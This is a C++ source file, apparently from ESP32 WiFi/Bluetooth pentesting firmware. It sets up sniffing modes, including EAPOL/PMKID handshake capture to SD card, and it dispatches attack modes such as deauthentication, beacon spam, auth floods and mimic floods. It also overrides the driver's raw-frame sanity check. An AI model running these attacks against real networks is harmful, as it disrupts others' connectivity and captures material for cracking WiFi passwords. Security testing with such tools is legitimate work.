#include "WiFiScan.h"
#include "lang_var.h"

int num_beacon = 0;
int num_deauth = 0;
int num_probe = 0;
int num_eapol = 0;

LinkedList<ssid>* ssids;
LinkedList<AccessPoint>* access_points;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    if (arg == 31337)
      return 1;
    else
      return 0;
}

#ifdef HAS_BT
  class bluetoothScanAllCallback: public BLEAdvertisedDeviceCallbacks {
  
      void onResult(BLEAdvertisedDevice *advertisedDevice) {
  
        #ifdef HAS_SCREEN
          int buf = display_obj.display_buffer->size();
        #else
          int buf = 0;
        #endif
          
        String display_string = "";
        if (buf >= 0)
        {
          display_string.concat(text_table4[0]);
          display_string.concat(advertisedDevice->getRSSI());
          Serial.print(" RSSI: ");
          Serial.print(advertisedDevice->getRSSI());
  
          display_string.concat(" ");
          Serial.print(" ");
          
          Serial.print("Device: ");
          if(advertisedDevice->getName().length() != 0)
          {
            display_string.concat(advertisedDevice->getName().c_str());
            Serial.print(advertisedDevice->getName().c_str());
            
          }
          else
          {
            display_string.concat(advertisedDevice->getAddress().toString().c_str());
            Serial.print(advertisedDevice->getAddress().toString().c_str());
          }
  
          #ifdef HAS_SCREEN
            uint8_t temp_len = display_string.length();
            for (uint8_t i = 0; i < 40 - temp_len; i++)
            {
              display_string.concat(" ");
            }
    
            Serial.println();
    
            while (display_obj.printing)
              delay(1);
            display_obj.loading = true;
            display_obj.display_buffer->add(display_string);
            display_obj.loading = false;
          #endif
        }
      }
  };
  
  class bluetoothScanSkimmersCallback: public BLEAdvertisedDeviceCallbacks {
      void onResult(BLEAdvertisedDevice *advertisedDevice) {
        String bad_list[bad_list_length] = {"HC-03", "HC-05", "HC-06"};
  
        #ifdef HAS_SCREEN
          int buf = display_obj.display_buffer->size();
        #else
          int buf = 0;
        #endif
          
        if (buf >= 0)
        {
          Serial.print("Device: ");
          String display_string = "";
          if(advertisedDevice->getName().length() != 0)
          {
            Serial.print(advertisedDevice->getName().c_str());
            for(uint8_t i = 0; i < bad_list_length; i++)
            {
              #ifdef HAS_SCREEN
                if(strcmp(advertisedDevice->getName().c_str(), bad_list[i].c_str()) == 0)
                {
                  display_string.concat(text_table4[1]);
                  display_string.concat(" ");
                  display_string.concat(advertisedDevice->getName().c_str());
                  uint8_t temp_len = display_string.length();
                  for (uint8_t i = 0; i < 40 - temp_len; i++)
                  {
                    display_string.concat(" ");
                  }
                  while (display_obj.printing)
                    delay(1);
                  display_obj.loading = true;
                  display_obj.display_buffer->add(display_string);
                  display_obj.loading = false;
                }
              #endif
            }
          }
          else
          {
            Serial.print(advertisedDevice->getAddress().toString().c_str());
          }
          Serial.print(" RSSI: ");
          Serial.println(advertisedDevice->getRSSI());
        }
      }
  };
#endif


WiFiScan::WiFiScan()
{
}

void WiFiScan::RunSetup() {
  if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1)
    this->wsl_bypass_enabled = true;
  else
    this->wsl_bypass_enabled = false;
    
  ssids = new LinkedList<ssid>();
  access_points = new LinkedList<AccessPoint>();

  #ifdef HAS_BT
    NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
    NimBLEDevice::setScanDuplicateCacheSize(200);
    NimBLEDevice::init("");
    pBLEScan = NimBLEDevice::getScan(); //create new scan
    this->ble_initialized = true;
    
    this->shutdownBLE();
  #endif

  this->initWiFi(1);
}

int WiFiScan::clearAPs() {
  int num_cleared = access_points->size();
  access_points->clear();
  Serial.println("access_points: " + (String)access_points->size());
  return num_cleared;
}

int WiFiScan::clearSSIDs() {
  int num_cleared = ssids->size();
  ssids->clear();
  Serial.println("ssids: " + (String)ssids->size());
  return num_cleared;
}

bool WiFiScan::addSSID(String essid) {
  ssid s = {essid, {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
  ssids->add(s);
  Serial.println(ssids->get(ssids->size() - 1).essid);

  return true;
}

int WiFiScan::generateSSIDs(int count) {
  uint8_t num_gen = count;
  for (uint8_t x = 0; x < num_gen; x++) {
    String essid = "";

    for (uint8_t i = 0; i < 6; i++)
      essid.concat(alfa[random(65)]);

    ssid s = {essid, {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
    ssids->add(s);
    Serial.println(ssids->get(ssids->size() - 1).essid);
  }

  return num_gen;
}

#ifdef HAS_SCREEN
  void WiFiScan::joinWiFi(String ssid, String password)
  {
    static const char * btns[] ={text16, ""};
    int count = 0;
    
    if ((WiFi.status() == WL_CONNECTED) && (ssid == connected_network) && (ssid != "")) {
      lv_obj_t * mbox1 = lv_msgbox_create(lv_scr_act(), NULL);
      lv_msgbox_set_text(mbox1, text_table4[2]);
      lv_msgbox_add_btns(mbox1, btns);
      lv_obj_set_width(mbox1, 200);
      lv_obj_align(mbox1, NULL, LV_ALIGN_CENTER, 0, 0); /*Align to the corner*/
      this->wifi_initialized = true;
      return;
    }
    else if (WiFi.status() == WL_CONNECTED) {
      Serial.println("Already connected. Disconnecting...");
      WiFi.disconnect();
    }
  
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_start();
      
    WiFi.begin(ssid.c_str(), password.c_str());
  
    Serial.print("Connecting to WiFi");
    while (WiFi.status() != WL_CONNECTED) {
      delay(500);
      Serial.print(".");
      count++;
      if (count == 10)
      {
        Serial.println("\nCould not connect to WiFi network");
        lv_obj_t * mbox1 = lv_msgbox_create(lv_scr_act(), NULL);
        lv_msgbox_set_text(mbox1, text_table4[3]);
        lv_msgbox_add_btns(mbox1, btns);
        lv_obj_set_width(mbox1, 200);
        //lv_obj_set_event_cb(mbox1, event_handler);
        lv_obj_align(mbox1, NULL, LV_ALIGN_CENTER, 0, 0); /*Align to the corner*/
        WiFi.mode(WIFI_OFF);
        return;
      }
    }
  
    lv_obj_t * mbox1 = lv_msgbox_create(lv_scr_act(), NULL);
    lv_msgbox_set_text(mbox1, text_table4[4]);
    lv_msgbox_add_btns(mbox1, btns);
    lv_obj_set_width(mbox1, 200);
    lv_obj_align(mbox1, NULL, LV_ALIGN_CENTER, 0, 0); /*Align to the corner*/
  
    connected_network = ssid;
    
    Serial.println("\nConnected to the WiFi network");
    Serial.print("IP address: ");
    Serial.println(WiFi.localIP());
    this->wifi_initialized = true;
  }
#endif

// Apply WiFi settings
void WiFiScan::initWiFi(uint8_t scan_mode) {
  // Set the channel
  if (scan_mode != WIFI_SCAN_OFF) {
    //Serial.println(F("Initializing WiFi settings..."));
    this->changeChannel();
  
    this->force_pmkid = settings_obj.loadSetting<bool>(text_table4[5]);
    this->force_probe = settings_obj.loadSetting<bool>(text_table4[6]);
    this->save_pcap = settings_obj.loadSetting<bool>(text_table4[7]);
    //Serial.println(F("Initialization complete"));
  }
}

bool WiFiScan::scanning() {
  if (this->currentScanMode == WIFI_SCAN_OFF)
    return false;
  else
    return true;
}

// Function to prepare to run a specific scan
void WiFiScan::StartScan(uint8_t scan_mode, uint16_t color)
{  
  this->initWiFi(scan_mode);
  if (scan_mode == WIFI_SCAN_OFF)
    StopScan(scan_mode);
  else if (scan_mode == WIFI_SCAN_PROBE)
    RunProbeScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_EAPOL)
    RunEapolScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_AP)
    RunBeaconScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_TARGET_AP)
    RunAPScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
    RunAPScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_PWN)
    RunPwnScan(scan_mode, color);
  else if (scan_mode == WIFI_SCAN_DEAUTH)
    RunDeauthScan(scan_mode, color);
  else if (scan_mode == WIFI_PACKET_MONITOR) {
    #ifdef HAS_SCREEN
      RunPacketMonitor(scan_mode, color);
    #endif
  }
  else if (scan_mode == WIFI_ATTACK_BEACON_LIST)
    this->startWiFiAttacks(scan_mode, color, text_table1[50]);
  else if (scan_mode == WIFI_ATTACK_BEACON_SPAM)
    this->startWiFiAttacks(scan_mode, color, text_table1[51]);
  else if (scan_mode == WIFI_ATTACK_RICK_ROLL)
    this->startWiFiAttacks(scan_mode, color, text_table1[52]);
  else if (scan_mode == WIFI_ATTACK_AUTH)
    this->startWiFiAttacks(scan_mode, color, text_table4[7]);
  else if (scan_mode == WIFI_ATTACK_DEAUTH)
    this->startWiFiAttacks(scan_mode, color, text_table4[8]);
  else if (scan_mode == WIFI_ATTACK_AP_SPAM)
    this->startWiFiAttacks(scan_mode, color, " AP Beacon Spam ");
  else if (scan_mode == BT_SCAN_ALL) {
    #ifdef HAS_BT
      RunBluetoothScan(scan_mode, color);
    #endif
  }
  else if (scan_mode == BT_SCAN_SKIMMERS) {
    #ifdef HAS_BT
      RunBluetoothScan(scan_mode, color);
    #endif
  }
  else if (scan_mode == WIFI_SCAN_ESPRESSIF)
    RunEspressifScan(scan_mode, color);
  else if (scan_mode == LV_JOIN_WIFI) {
    #ifdef HAS_SCREEN
      RunLvJoinWiFi(scan_mode, color);
    #endif
  }
  else if (scan_mode == LV_ADD_SSID) {
    #ifdef HAS_SCREEN
      RunLvJoinWiFi(scan_mode, color);
    #endif
  }

  WiFiScan::currentScanMode = scan_mode;
}

void WiFiScan::startWiFiAttacks(uint8_t scan_mode, uint16_t color, String title_string) {
  // Common wifi attack configurations
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    display_obj.tft.fillRect(0,16,240,16, color);
    display_obj.tft.drawCentreString((String)title_string,120,16,2);
    display_obj.touchToExit();
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
  #endif
  packets_sent = 0;
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_AP_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous_filter(NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(78);
  this->wifi_initialized = true;
  initTime = millis();
}

bool WiFiScan::shutdownWiFi() {
  if (this->wifi_initialized) {
    esp_wifi_set_promiscuous(false);
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);
  
    esp_wifi_set_mode(WIFI_MODE_NULL);
    esp_wifi_stop();
    esp_wifi_deinit();
  
    this->wifi_initialized = false;
    return true;
  }
  else {
    return false;
  }
}

bool WiFiScan::shutdownBLE() {
  #ifdef HAS_BT
    if (this->ble_initialized) {
      pBLEScan->stop();
      
      pBLEScan->clearResults();
      BLEDevice::deinit();
    
      this->ble_initialized = false;
      return true;
    }
    else {
      return false;
    }
  #endif

  return true;
}

// Function to stop all wifi scans
void WiFiScan::StopScan(uint8_t scan_mode)
{
  if ((currentScanMode == WIFI_SCAN_PROBE) ||
  (currentScanMode == WIFI_SCAN_AP) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP) ||
  (currentScanMode == WIFI_SCAN_TARGET_AP_FULL) ||
  (currentScanMode == WIFI_SCAN_PWN) ||
  (currentScanMode == WIFI_SCAN_ESPRESSIF) ||
  (currentScanMode == WIFI_SCAN_EAPOL) ||
  (currentScanMode == WIFI_SCAN_ALL) ||
  (currentScanMode == WIFI_SCAN_DEAUTH) ||
  (currentScanMode == WIFI_ATTACK_BEACON_LIST) ||
  (currentScanMode == WIFI_ATTACK_BEACON_SPAM) ||
  (currentScanMode == WIFI_ATTACK_AUTH) ||
  (currentScanMode == WIFI_ATTACK_DEAUTH) ||
  (currentScanMode == WIFI_ATTACK_MIMIC) ||
  (currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
  (currentScanMode == WIFI_PACKET_MONITOR) ||
  (currentScanMode == LV_JOIN_WIFI))
  {
    this->shutdownWiFi();
  }

  
  else if ((currentScanMode == BT_SCAN_ALL) ||
  (currentScanMode == BT_SCAN_SKIMMERS))
  {
    #ifdef HAS_BT
      this->shutdownBLE();
    #endif
  }

  #ifdef HAS_SCREEN
    display_obj.display_buffer->clear();
    //Serial.print("display_buffer->size(): ");
    Serial.println(display_obj.display_buffer->size());
  
    display_obj.tteBar = false;
  #endif
}

String WiFiScan::getStaMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}

String WiFiScan::getApMAC()
{
  char *buf;
  uint8_t mac[6];
  char macAddrChr[18] = {0};
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
  this->wifi_initialized = true;
  sprintf(macAddrChr, 
          "%02X:%02X:%02X:%02X:%02X:%02X",
          mac[0],
          mac[1],
          mac[2],
          mac[3],
          mac[4],
          mac[5]);
  this->shutdownWiFi();
  return String(macAddrChr);
}


String WiFiScan::freeRAM()
{
  char s[150];
  sprintf(s, "RAM Free: %u bytes", esp_get_free_heap_size());
  this->free_ram = String(esp_get_free_heap_size());
  return String(s);
}

// Function to start running a beacon scan
void WiFiScan::RunAPScan(uint8_t scan_mode, uint16_t color)
{
  sd_obj.openCapture("ap");

  Serial.println(text_table4[9] + (String)access_points->size());
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    display_obj.tft.fillRect(0,16,240,16, color);
    display_obj.tft.drawCentreString(text_table4[44],120,16,2);
    display_obj.touchToExit();
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
    esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
  else
    esp_wifi_set_promiscuous_rx_cb(&apSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

#ifdef HAS_SCREEN
  void WiFiScan::RunLvJoinWiFi(uint8_t scan_mode, uint16_t color) {
  
    display_obj.tft.init();
    display_obj.tft.setRotation(1);
    
    #ifdef TFT_SHIELD
      uint16_t calData[5] = { 391, 3491, 266, 3505, 7 }; // Landscape TFT Shield
      Serial.println("Using TFT Shield");
    #else if defined(TFT_DIY)
      uint16_t calData[5] = { 213, 3469, 320, 3446, 1 }; // Landscape TFT DIY
      Serial.println("Using TFT DIY");
    #endif
    display_obj.tft.setTouch(calData);
    
  
    lv_obj_t * scr = lv_cont_create(NULL, NULL);
    lv_disp_load_scr(scr);
  
  }
#endif

void WiFiScan::RunClearAPs() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[9]));
    display_obj.tft.println(text_table4[10] + (String)this->clearAPs());
  #else
    this->clearAPs();
  #endif
}

void WiFiScan::RunClearSSIDs() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[11]));
    display_obj.tft.println(text_table4[12] + (String)this->clearSSIDs());
  #else
    this->clearSSIDs();
  #endif
}

void WiFiScan::RunGenerateSSIDs(int count) {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.println(F(text_table4[13]));
  
    display_obj.tft.println(text_table4[14] + (String)this->generateSSIDs());
    display_obj.tft.println(text_table4[15] + (String)ssids->size());
  #else
    this->generateSSIDs(count);
  #endif
}

void WiFiScan::RunShutdownWiFi() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);

    display_obj.tft.print(F(text_table4[16]));
  #endif

  if (this->wifi_initialized) {
    this->shutdownWiFi();
    #ifdef HAS_SCREEN
      display_obj.tft.setTextColor(TFT_GREEN);
      display_obj.tft.println(F("OK"));
    #endif
  }
  else {
    #ifdef HAS_SCREEN
      display_obj.tft.setTextColor(TFT_RED);
      display_obj.tft.println(F(text17));
      display_obj.tft.println(F(text_table4[17]));
    #endif
  }
}

void WiFiScan::RunShutdownBLE() {
  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
  
    display_obj.tft.print(F(text_table4[18]));
  #endif

  if (this->ble_initialized) {
    this->shutdownBLE();
    #ifdef HAS_SCREEN
      display_obj.tft.setTextColor(TFT_GREEN);
      display_obj.tft.println(F("OK"));
    #endif
  }
  else {
    #ifdef HAS_SCREEN
      display_obj.tft.setTextColor(TFT_RED);
      display_obj.tft.println(F(text17));
      display_obj.tft.println(F(text_table4[19]));
    #endif
  }
}

void WiFiScan::RunInfo()
{
  String sta_mac = this->getStaMAC();
  String ap_mac = this->getApMAC();
  String free_ram = this->freeRAM();
  
  //Serial.print("STA MAC: ");
  //Serial.println(sta_mac);
  //Serial.print("AP MAC: ");
  //Serial.println(ap_mac);
  Serial.println(free_ram);

  #ifdef HAS_SCREEN
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setCursor(0, 100);
    display_obj.tft.setTextSize(1);
    display_obj.tft.setTextColor(TFT_CYAN);
    display_obj.tft.println(text_table4[20]);
    display_obj.tft.println(text_table4[21] + display_obj.version_number + "\n");
    display_obj.tft.println(text_table4[22] + (String)esp_get_idf_version());
  #endif

  if (this->wsl_bypass_enabled) {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[23]);
    #endif
  }
  else {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[24]);
    #endif
  }

  #ifdef HAS_SCREEN
    display_obj.tft.println(text_table4[25] + sta_mac);
    display_obj.tft.println(text_table4[26] + ap_mac);
    display_obj.tft.println(text_table4[27] + free_ram);
  #endif

  if (sd_obj.supported) {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[28]);
      display_obj.tft.print(text_table4[29]);
      display_obj.tft.print(sd_obj.card_sz);
      display_obj.tft.println("MB");
    #endif
  }
  else {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[30]);
      display_obj.tft.println(text_table4[31]);
    #endif
  }  

  battery_obj.battery_level = battery_obj.getBatteryLevel();
  if (battery_obj.i2c_supported) {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[32]);
      display_obj.tft.println(text_table4[33] + (String)battery_obj.battery_level + "%");
    #endif
  }
  else {
    #ifdef HAS_SCREEN
      display_obj.tft.println(text_table4[34]);
    #endif
  }

  #ifdef HAS_SCREEN
    display_obj.tft.println(text_table4[35] + (String)temp_obj.current_temp + " C");
  #endif
}

void WiFiScan::RunEspressifScan(uint8_t scan_mode, uint16_t color) {
  sd_obj.openCapture("espressif");

  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    display_obj.tft.fillRect(0,16,240,16, color);
    display_obj.tft.drawCentreString(text_table4[36],120,16,2);
    display_obj.touchToExit();
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&espressifSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color)
{
  #ifdef HAS_SCREEN
    display_obj.tft.init();
    display_obj.tft.setRotation(1);
    display_obj.tft.fillScreen(TFT_BLACK);
  #endif

  sd_obj.openCapture("packet_monitor");

  #ifdef HAS_SCREEN
    #ifdef TFT_SHIELD
      uint16_t calData[5] = { 391, 3491, 266, 3505, 7 }; // Landscape TFT Shield
      Serial.println("Using TFT Shield");
    #else if defined(TFT_DIY)
      uint16_t calData[5] = { 213, 3469, 320, 3446, 1 }; // Landscape TFT DIY
      Serial.println("Using TFT DIY");
    #endif
    display_obj.tft.setTouch(calData);
  
    //display_obj.tft.setFreeFont(1);
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setTextSize(1);
    display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); // Buttons
    display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // color key
  
    delay(10);
  
    display_obj.tftDrawGraphObjects(x_scale); //draw graph objects
    display_obj.tftDrawColorKey();
    display_obj.tftDrawXScaleButtons(x_scale);
    display_obj.tftDrawYScaleButtons(y_scale);
    display_obj.tftDrawChannelScaleButtons(set_channel);
    display_obj.tftDrawExitScaleButtons();
  #endif

  Serial.println("Running packet scan...");
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  uint32_t initTime = millis();
}

void WiFiScan::RunEapolScan(uint8_t scan_mode, uint16_t color)
{
  num_eapol = 0;

  #ifdef HAS_SCREEN
    display_obj.tft.init();
    display_obj.tft.setRotation(1);
    display_obj.tft.fillScreen(TFT_BLACK);
  #endif

  sd_obj.openCapture("eapol");

  #ifdef HAS_SCREEN
    #ifdef TFT_SHIELD
      uint16_t calData[5] = { 391, 3491, 266, 3505, 7 }; // Landscape TFT Shield
      //Serial.println("Using TFT Shield");
    #else if defined(TFT_DIY)
      uint16_t calData[5] = { 213, 3469, 320, 3446, 1 }; // Landscape TFT DIY
      //Serial.println("Using TFT DIY");
    #endif
    display_obj.tft.setTouch(calData);
  
    display_obj.tft.setFreeFont(NULL);
    display_obj.tft.setTextSize(1);
    display_obj.tft.fillRect(127, 0, 193, 28, TFT_BLACK); // Buttons
    display_obj.tft.fillRect(12, 0, 90, 32, TFT_BLACK); // color key
  
    delay(10);
  
    display_obj.tftDrawGraphObjects(x_scale); //draw graph objects
    display_obj.tftDrawEapolColorKey();
    display_obj.tftDrawChannelScaleButtons(set_channel);
    display_obj.tftDrawExitScaleButtons();
  #endif


  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}


// Function to prepare for beacon mimic
void WiFiScan::RunMimicFlood(uint8_t scan_mode, uint16_t color) {
  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    display_obj.tft.fillRect(0,16,240,16, color);
    display_obj.tft.drawCentreString(" Mimic Flood ",120,16,2);
    display_obj.touchToExit();
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
  #endif
  
  packets_sent = 0;
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_AP_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous_filter(NULL);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(78);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color)
{
  sd_obj.openCapture("pwnagotchi");

  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    display_obj.tft.fillRect(0,16,240,16, color);
    display_obj.tft.drawCentreString(text_table4[37],120,16,2);
    display_obj.touchToExit();
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&pwnSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

// Function to start running a beacon scan
void WiFiScan::RunBeaconScan(uint8_t scan_mode, uint16_t color)
{
  sd_obj.openCapture("beacon");

  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_WHITE, color);
    display_obj.tft.fillRect(0,16,240,16, color);
    display_obj.tft.drawCentreString(text_table4[38],120,16,2);
    display_obj.touchToExit();
    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}

void WiFiScan::RunDeauthScan(uint8_t scan_mode, uint16_t color)
{
  sd_obj.openCapture("deauth");

  #ifdef HAS_SCREEN
    display_obj.TOP_FIXED_AREA_2 = 48;
    display_obj.tteBar = true;
    display_obj.print_delay_1 = 15;
    display_obj.print_delay_2 = 10;
    display_obj.initScrollValues(true);
    display_obj.tft.setTextWrap(false);
    display_obj.tft.setTextColor(TFT_BLACK, color);
    display_obj.tft.fillRect(0,16,240,16, color);
    display_obj.tft.drawCentreString(text_table4[39],120,16,2);
    display_obj.touchToExit();
    display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
    display_obj.setupScrollArea(display_obj.TOP_FIXED_AREA_2, BOT_FIXED_AREA);
  #endif
  
  esp_wifi_init(&cfg);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&deauthSnifferCallback);
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  this->wifi_initialized = true;
  initTime = millis();
}


// Function for running probe request scan
void WiFiScan::RunProbeScan(uint8_t scan_mode, uint16_t color)
{
  sd_obj.openCapture("probe");

  #ifdef HAS_SCREEN
